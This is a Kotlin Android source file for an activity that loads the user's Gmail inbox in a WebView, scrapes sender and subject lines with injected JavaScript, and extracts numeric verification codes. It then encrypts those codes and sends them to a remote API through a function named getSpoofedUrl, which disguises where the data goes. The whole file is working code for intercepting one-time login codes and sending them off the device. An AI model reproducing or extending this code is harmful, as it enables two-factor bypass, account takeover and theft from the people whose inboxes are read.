package com.gafam.relay

import android.app.Activity
import android.graphics.Bitmap
import android.os.Bundle
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import org.json.JSONObject
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import android.util.Base64
import kotlin.concurrent.thread
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody

class GmailScrapeActivity : Activity() {

    companion object {
        private const val TAG = "GAFAM_GmailScrape"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val isSetup = intent.getBooleanExtra("setup", false)

        val wv = WebView(this).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.userAgentString = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36"
        }
        CookieManager.getInstance().acceptCookie()

        setContentView(wv)

        wv.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView, url: String) {
                Log.i(TAG, "Page: $url")

                if (url.contains("mail.google.com") && !url.contains("accounts.google.com")) {
                    // We're in Gmail inbox
                    view.evaluateJavascript("""
                        (function() {
                            var rows = document.querySelectorAll('tr.zA');
                            var emails = [];
                            rows.forEach(function(r) {
                                var s = (r.querySelector('.bog')||r.querySelector('[data-thread-id]')||{}).textContent||'';
                                var f = (r.querySelector('.yP')||r.querySelector('.zF')||{}).textContent||'';
                                emails.push(f + ': ' + s);
                            });
                            return JSON.stringify(emails);
                        })()
                    """.trimIndent()) { result ->
                        Log.i(TAG, "Emails: ${result?.take(500)}")
                        if (result != null && result != "null") {
                            val emailList = parseEmails(result)
                            for (email in emailList) {
                                val codes = extractCodes(email)
                                if (codes.isNotEmpty()) {
                                    sendToVpc("gmail.scrape", email, email, codes)
                                }
                            }
                        }
                        finish()
                    }
                } else if (url.contains("accounts.google.com")) {
                    Log.w(TAG, "Login needed — ${if (isSetup) "setup mode (staying open)" else "auto-close in 30s"}")
                    if (!isSetup) {
                        view.postDelayed({ finish() }, 30000)
                    }
                    // In setup mode, stay open until user presses back
                }
            }

            override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                Log.d(TAG, "Started: $url")
            }
        }

        Log.i(TAG, "Loading Gmail...")
        wv.loadUrl("https://mail.google.com/mail/u/0/")
    }

    private fun parseEmails(jsonStr: String): List<String> {
        return try {
            val clean = jsonStr.trim('"').replace("\\\"", "\"")
            val arr = org.json.JSONArray(clean)
            (0 until arr.length()).map { arr.getString(it) }
        } catch (e: Exception) { emptyList() }
    }

    private fun extractCodes(text: String): List<String> {
        val patterns = listOf(
            Regex("""\b(\d{4,8})\b"""),
            Regex("""code[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
            Regex("""verify[\s:]+(\d{4,8})""", RegexOption.IGNORE_CASE),
        )
        val codes = mutableListOf<String>()
        for (pat in patterns) {
            for (match in pat.findAll(text)) {
                val code = match.groupValues.getOrNull(1) ?: match.value
                if (code !in codes) codes.add(code)
            }
        }
        return codes
    }

    private fun sendToVpc(from: String, subject: String, body: String, codes: List<String>) {
        val prefs = getSharedPreferences("GAFAM_PREFS", MODE_PRIVATE)
        val apiUrl = prefs.getString("apiUrl", null) ?: return
        val jwtSecret = prefs.getString("jwtSecret", null) ?: return
        try {
            val client = ApiClient.getClient(this) ?: return
            val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/email/notif")
            val jsonBody = JSONObject().apply {
                put("app", "gmail.scrape")
                put("title", subject)
                put("body", body)
                put("from", from)
                put("codes", JSONObject.wrap(codes))
                put("timestamp", System.currentTimeMillis())
            }
            val cipher = Cipher.getInstance("AES/GCM/NoPadding")
            val iv = ByteArray(12); SecureRandom().nextBytes(iv)
            val key = SecretKeySpec(MessageDigest.getInstance("SHA-256").digest(jwtSecret.toByteArray()), "AES")
            cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(128, iv))
            val encryptedPayload = JSONObject().apply {
                put("encrypted_data", Base64.encodeToString(cipher.doFinal(jsonBody.toString().toByteArray()), Base64.NO_WRAP))
                put("iv", Base64.encodeToString(iv, Base64.NO_WRAP))
            }
            val req = Request.Builder().url(spoofedUrl)
                .post(encryptedPayload.toString().toRequestBody("application/json".toMediaType()))
                .addHeader("Authorization", "Bearer $jwtSecret").build()
            client.newCall(req).execute()
            Log.i(TAG, "📧 Sent: $subject codes=$codes")
        } catch (e: Exception) { Log.e(TAG, "Send: ${e.message}") }
    }

    override fun onBackPressed() { finish() }
}
